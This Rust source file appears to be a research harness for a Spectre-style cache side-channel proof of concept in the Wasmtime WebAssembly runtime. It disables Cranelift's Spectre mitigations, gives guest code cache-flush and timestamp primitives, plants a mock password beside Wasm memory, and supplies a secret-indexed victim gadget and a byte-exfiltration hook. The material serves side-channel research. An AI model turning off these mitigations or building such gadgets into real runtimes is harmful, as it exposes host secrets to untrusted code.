use std::arch::asm;
#[cfg(all(target_arch = "x86_64"))]
use std::arch::x86_64::_mm_clflush;
#[cfg(all(target_arch = "x86_64"))]
use std::arch::x86_64::_mm_lfence;
#[cfg(all(target_arch = "x86_64"))]
use std::arch::x86_64::_mm_mfence;
use std::io::Write;
use wasmtime::*;
use wasmtime_wasi::sync::WasiCtxBuilder;
use std::sync::Arc;
use std::sync::Mutex;
use std::ops::Range;
use std::ffi::c_void;

const STRIDE: usize = 256;
const PAD: usize = 160;

const data_size: usize = 11;

static mut public_data: [u8; PAD] = [2; PAD/*pad here*/];

// TODO add padding to match the cache line size
// We need to pad the array to make cache lines aligned
// const array_for_prediction: [u8; 256 * STRIDE] = [0; 256 * STRIDE];
static mut tmp: u8 = 0;

pub static mut exfiltrated: Vec<u8> = vec![];


static mut NEWMEMCOUNT: u32 = 0;
const SCALE: usize = 1;
static mut STATIC_ADDRESS_START: *mut c_void = 0x2000_0000 as *mut c_void;
static mut STATIC_ADDRESS: *mut c_void = 0x2000_0000 as *mut c_void;
static mut STATIC_ADDRESS2: *mut c_void = 0x1000_0000 as *mut c_void;
// Allocate SECRET 



struct MemoryAllocator;

struct OwnMemory  {
    pub ptr: Arc<Mutex<*mut u8>>,
    pub size: usize
}

unsafe impl Send for OwnMemory {}
unsafe impl Sync for OwnMemory {}

unsafe impl wasmtime::LinearMemory for OwnMemory {
    
    fn byte_size(&self) -> usize {
        self.size
    }

    fn maximum_byte_size(&self) -> Option<usize> {
        Some(self.size)
    }

    fn wasm_accessible(&self) -> Range<usize> {
        0..self.size + 1
    }

    fn as_ptr(&self) -> *mut u8 {
        self.ptr.lock().unwrap().clone()
    }

    fn grow_to(&mut self, new_size: usize) -> Result<()> {
        Ok(())
    }


}

impl OwnMemory {


    pub fn new(ptr: *mut u8, size: usize) -> Self {
        Self {
            ptr: Arc::new(Mutex::new(ptr)), size
        }
    }
}

unsafe impl wasmtime::MemoryCreator for MemoryAllocator {

    fn new_memory(
        &self,
        ty: MemoryType,
        minimum: usize,
        maximum: Option<usize>,
        reserved_size_in_bytes: Option<usize>,
        guard_size_in_bytes: usize
    ) -> Result<Box<dyn LinearMemory>, String> {
        // eprintln!("ty {:?}", ty);
        eprintln!("reserved_size_in_bytes {:?}", reserved_size_in_bytes);
        // * WASM_PAGE_SIZE
        // To shrink the allocated memory for the binary just set the number below to 0.5 for example
        // TODO make this and option
        let PSIZE: f32 = 0.01;
        let total_bytes = match maximum {
            Some(max) => (max as f32 *PSIZE) as usize,
            None => (minimum as f32*PSIZE) as usize,
        };
        eprintln!("total_bytes {:?}", total_bytes);

        unsafe { eprintln!("mem at {:?}({})", STATIC_ADDRESS, total_bytes) };
        
        let mem = unsafe {
            let r = rustix::mm::mmap_anonymous(
                STATIC_ADDRESS,
                total_bytes,
                rustix::mm::ProtFlags::READ | rustix::mm::ProtFlags::WRITE,
                rustix::mm::MapFlags::PRIVATE, // | rustix::mm::MapFlags::FIXED,
            ).expect("Memory could not be allocated");
            STATIC_ADDRESS = STATIC_ADDRESS.add(total_bytes + PAD);
            r
        };

        let linearmem = OwnMemory::new(mem as *mut u8, total_bytes);

        
        Ok(Box::new(linearmem))
    }
}

#[link(name = "valgrind")]
extern "C" {
    fn create_lock();
    fn set_lock(val: u8);
}

#[no_mangle]
pub fn notify_mem(ptr: *mut libc::c_void, size: usize){
    eprintln!("Executable memory at {:?}({})", ptr, size);
    // Only notify the second one to avoid the instrumentation of WASI. TODO, check if this makes sense
    //if unsafe { NEWMEMCOUNT == 1 } {
        // This is the module
    //eprintln!("Calling valgrind DISCARD_TRANSLATIONS");
    // unsafe { discard_translations(ptr, size); }
    //}
    //unsafe { NEWMEMCOUNT += 1; }
}


#[no_mangle]
pub fn custom_reserve(size: usize) -> *mut libc::c_void {
    let ptr = unsafe {
        let r = rustix::mm::mmap_anonymous(
            STATIC_ADDRESS,
            size,
            rustix::mm::ProtFlags::READ | rustix::mm::ProtFlags::WRITE,
            rustix::mm::MapFlags::PRIVATE | rustix::mm::MapFlags::FIXED,
        ).expect("Memory could not be allocated");
        STATIC_ADDRESS = STATIC_ADDRESS.add(size + PAD);
        r
    };
    
    eprintln!("allocating at {:?}", ptr);
    ptr

}

#[no_mangle]
pub fn custom_allocator(size: usize) -> *mut libc::c_void {
    unsafe { eprintln!("allocating at {:?} ({})", STATIC_ADDRESS2, size*SCALE) };

    let ptr = unsafe {
        let r = rustix::mm::mmap_anonymous(
            STATIC_ADDRESS2,
            size*SCALE,
            rustix::mm::ProtFlags::READ | rustix::mm::ProtFlags::WRITE,
            rustix::mm::MapFlags::PRIVATE, // rustix::mm::MapFlags::FIXED,
        ).expect("Memory could not be allocated");
        STATIC_ADDRESS2 = STATIC_ADDRESS2.add(size*SCALE + PAD);
        r
    };
    
    ptr

}

#[no_mangle]
pub fn custom_file_allocator(size: usize, file: &std::fs::File) -> *mut libc::c_void {
    eprintln!("Allocating file");
    let ptr = unsafe {
        let r = rustix::mm::mmap(
            STATIC_ADDRESS,
            size,
                rustix::mm::ProtFlags::READ | rustix::mm::ProtFlags::WRITE,
                rustix::mm::MapFlags::PRIVATE, // | rustix::mm::MapFlags::FIXED,
                &file,
                0,
            ).expect("Memory could not be allocated");
            STATIC_ADDRESS = STATIC_ADDRESS.add(size + PAD);
        r
    };
    ptr
}


#[cfg(all(target_arch = "x86_64"))]
#[inline]
pub fn read_memory_offset(ptr: *const u8) -> u8 {
    let result: u8 = 0;
    unsafe {
        asm!(
            "mov {result}, [{x}]",
            x = in(reg) ptr,
            result = out(reg_byte) _
        );
    };
    result
}


#[cfg(all(target_arch="x86_64"))]
pub fn _rdtsc() -> u64 {
    let eax: u32;
  let ecx: u32;
  let edx: u32;
  {
    unsafe {
      asm!(
        "rdtscp",
        lateout("eax") eax,
        lateout("ecx") ecx,
        lateout("edx") edx,
        options(nomem, nostack)
      );
    }
  }


  let counter: u64 = (edx as u64) << 32 | eax as u64;
  counter
}


pub fn create_linker(engine: &wasmtime::Engine) -> wasmtime::Linker<wasmtime_wasi::WasiCtx> {
    let mut linker = wasmtime::Linker::new(&engine);

    wasmtime_wasi::add_to_linker(&mut linker, |s| s).unwrap();
    // These methods are not in WASI by default, yet, let us assume they are
    // It is the same assumption of Swivel
    let linker = linker
        .func_wrap(
            "env",
            "_mm_clflush",
            |mut caller: wasmtime::Caller<'_, _>, param: u32| {
                // get the memory of the module
                // This comes on the guest address space, we need to translate it to the host address space

                let memory = caller.get_export("memory").unwrap().into_memory().unwrap();
                let memory_data = memory.data(&mut caller);
                let addr = &memory_data[param as usize] as *const u8;

                //                println!("Flush {:?}", addr);
                // flush the real address of the memory index
                unsafe {
                    asm! {
                       "clflush [{x}]",
                       x = in(reg) addr
                    }
                }
            },
        )
        .unwrap();

    let linker = linker
        .func_wrap(
            "env",
            "_mm_mfence",
            |_caller: wasmtime::Caller<'_, _>| unsafe {
                // println!("_mm_mfence");
                _mm_mfence();
            },
        )
        .unwrap();

    let linker = linker
        .func_wrap("env", "_rdtsc", |_caller: wasmtime::Caller<'_, _>| unsafe {
            _rdtsc()
        })
        .unwrap();

    let linker = linker
        .func_wrap(
            "env",
            "_mm_lfence",
            |_caller: wasmtime::Caller<'_, _>, _param: i32| unsafe {
                _mm_lfence();
            },
        )
        .unwrap();

    // This function does not exist in reality. We use it only to simulate a syncrhonized attack
    // We force the branch training to be syncronized when the attacker starts to measure (see
    // lines 146-154 of the spectre_wasm.rs file )
    //
    // Get the memory content
    
    //let secret_data_bytes = STATIC_ADDRESS_START;

    let mut secret_data_bytes = unsafe { core::slice::from_raw_parts_mut(STATIC_ADDRESS_START as *mut u8, 11) };
    let linker = linker
        .func_wrap(
            "env",
            "victim_code",
            |mut caller: wasmtime::Caller<'_, _>, i: u32| {

                // Trace where this is happening
                unsafe {set_lock(0)};

                // get the memory of the module
                // In theory it should be our own allocation
                let memory = caller.get_export("memory").unwrap().into_memory().unwrap();
                let memory_data = memory.data(&mut caller);

                let location = i as usize;
                //if location < data_size {
                unsafe {
                    let addr =
                        &memory_data[secret_data_bytes[location] as usize * STRIDE] as *const u8;
                    // lets print the address for logging
                    //println!("access {:?}", addr);

                    tmp &= read_memory_offset(addr);
                };

                unsafe {set_lock(1)};

                //}
            },
        )
        .unwrap();

    // For the POC only to exfiltrate the bytes
    let linker = linker
        .func_wrap(
            "env",
            "save_byte",
            |_caller: wasmtime::Caller<'_, _>, param: i32| unsafe {
                unsafe {
                    exfiltrated.push(param as u8);
                }
            },
        )
        .unwrap();

    linker.clone()
}

pub fn execute_wasm(path: String) {
    // TODO Check if precompiled is better :"
    println!("T-> Executing {}", path);

    let pathcp = path.clone();
    let filename = pathcp.split("/").last().unwrap();
    let binary = std::fs::read(path).unwrap();

    // Compile the binary and execute it with wasmtime

    let mut config = wasmtime::Config::default();
    let config = config.strategy(wasmtime::Strategy::Cranelift);
    // Remove spectre protection
    let config = config.cranelift_nan_canonicalization(false);
    let config =
        unsafe { config.cranelift_flag_set("enable_heap_access_spectre_mitigation", "no") };
    let config =
        unsafe { config.cranelift_flag_set("enable_table_access_spectre_mitigation", "no") };
    
    let allocator = MemoryAllocator;
    //let mut config = config.with_host_memory(Arc::new(allocator));
    
    // This actually produces the same default binary :|
    // let config = config.cranelift_opt_level(wasmtime::OptLevel::SpeedAndSize);

    // We need to save the generated machine code to disk

    // Create a new store
    let engine = wasmtime::Engine::new(&config).unwrap();

    let module = wasmtime::Module::new(&engine, binary).unwrap();

    // Serialize it
    // TODO check if it was already serialized, avoid compiling again
    let serialized = module.serialize().unwrap();
    // Save it to disk, get the filename from the argument path
    std::fs::write(format!("{}.obj", filename), serialized).unwrap();

    let wasi = WasiCtxBuilder::new()
        .inherit_stdio()
        .inherit_args()
        .unwrap()
        .build();

    // TODO share the linker between instances ?
    let mut linker = create_linker(&engine);
    let mut store = wasmtime::Store::new(&engine, wasi);

    /*store.call_hook(/* when the wasm execution starts, then enable the recording */ |t, tpe|{
        match tpe {
            // Detect if it is a WASI function

            wasmtime::CallHook::CallingHost => {
                unsafe {set_lock(1)};
            },
            wasmtime::CallHook::ReturningFromHost => {
                unsafe {set_lock(0)};
            }
            _ => {

            }
        }
        Ok(())
    });*/
    
    // let instance = linker.instantiate(&mut store, &module).unwrap();

    linker.module(&mut store, "", &module).unwrap();

    linker
        .get_default(&mut store, "")
        .unwrap()
        .typed::<(), ()>(&mut store)
        .unwrap()
        .call(&mut store, ())
        .unwrap();

    println!("-> Exeuting finished");
}

pub fn main() {

    // Allocate the SECRET at the side of the Wasm memory for better accuracy
    let ptr = unsafe {
        let r = rustix::mm::mmap_anonymous(
            STATIC_ADDRESS,
            11,
            rustix::mm::ProtFlags::READ | rustix::mm::ProtFlags::WRITE,
            rustix::mm::MapFlags::PRIVATE | rustix::mm::MapFlags::FIXED,
        ).expect("Memory could not be allocated");
        STATIC_ADDRESS = STATIC_ADDRESS.add(11 + PAD);
      
        // Set the PTR content
        let mut ptr = core::slice::from_raw_parts_mut(r as *mut u8, 11);
        ptr[0] = b'M' ;
        ptr[1] = b'y' ;
        ptr[2] = b' ' ;
        ptr[3] = b'p' ;
        ptr[4] = b'a' ;
        ptr[5] = b's' ;
        ptr[6] = b's' ;
        ptr[7] = b'w' ;
        ptr[8] = b'o' ;
        ptr[9] = b'r' ;
        ptr[10] = b'd' ;
        eprintln!("Setting the secret data");

        r
    };
    eprintln!("Secret data done");

    unsafe { create_lock() };
    // Creates a lock file here
    unsafe {set_lock(1)};

    // Setting up the data
    unsafe {
        public_data[0] = 1;
        public_data[1] = 2;
        public_data[2] = 3;
        public_data[3] = 4;
        public_data[4] = 5;
        public_data[5] = 6;
        public_data[6] = 7;
        public_data[7] = 8;
        public_data[8] = 9;
        public_data[9] = 10;
        public_data[10] = 11;
        public_data[11] = 12;
        public_data[12] = 13;
        public_data[13] = 14;
        public_data[14] = 15;
        public_data[15] = 16;
    }

    // Load the eviction binary first as the attacker an run it
    // TODO, get the binary from the command line first argument
    let args: Vec<String> = std::env::args().collect();

    // Create two threads, one hearing for "execute" command, once received, execute the binary
    // into a separate thread
    // TODO share the linker

    // let mut threads = vec![];
    println!("-> Type a token to command");
    print!("-> ");
    std::io::stdout().flush().unwrap();
    loop {
        // Read the command line
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).unwrap();
        println!("-> Processing command '{}'", input.trim());
        print!("\r-> ");
        std::io::stdout().flush().unwrap();
        // Flush std
        if input.trim() == "execute" {
            println!("   Type the number of times to execute");
            let mut input = String::new();
            // Read the next line to get the number of times to execute
            std::io::stdin().read_line(&mut input).unwrap();
            let inputcp = input.clone();
            let times = inputcp.trim().parse::<u32>().unwrap();
            println!("   Type the path of the file to execute");
            let mut input = String::new();

            // Read the next line to get the filename path of the file to execute
            std::io::stdin().read_line(&mut input).unwrap();

            // Discard last character which is the endline

            let inputcp = input.clone();
            let path = String::from(inputcp.trim());

            /*let job = std::thread::spawn(move || {
                for i in 0..times {
                    println!("   {}", i);
                    execute_wasm(path.clone());
                }
            });
            threads.push(job);*/
            // Launch the thread to execute
            for i in 0..times {
                println!("   {}", i);
                execute_wasm(path.clone());
            }

            println!("-> Executing '{}' into a separated thread", input.trim());
            print!("\r-> ");
            break;
            std::io::stdout().flush().unwrap();
        } else if input.trim() == "exit" {
            // Wait for all threads, and the exit
            println!("-> Waiting for pending threads");
            //for t in threads {
            //    t.join().unwrap();
            //}
            break;
        } else {
            eprintln!("-> Invalid command '{}' ", input.trim());
            print!("\r-> ");
            std::io::stdout().flush().unwrap();
        }
    }
}
